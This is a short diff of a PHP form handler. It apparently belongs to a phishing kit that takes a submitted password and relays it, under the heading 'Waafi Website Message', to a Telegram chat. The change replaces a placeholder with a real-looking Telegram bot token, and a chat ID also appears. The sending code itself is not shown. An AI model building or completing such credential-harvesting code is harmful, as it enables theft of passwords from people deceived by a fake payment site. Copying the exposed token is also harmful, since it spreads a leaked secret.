@@ -10,7 +10,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
         die('All fields are required.');
     }
 
-    $botToken = "YOUR_BOT_TOKEN";
+    $botToken = "8648558019:AAHImsUZ7UJK8t1b629JTTxSd3vvHpH0rhY";
     $chatId   = "1135238504";
 
     $text = "Waafi Website Message\n\n"
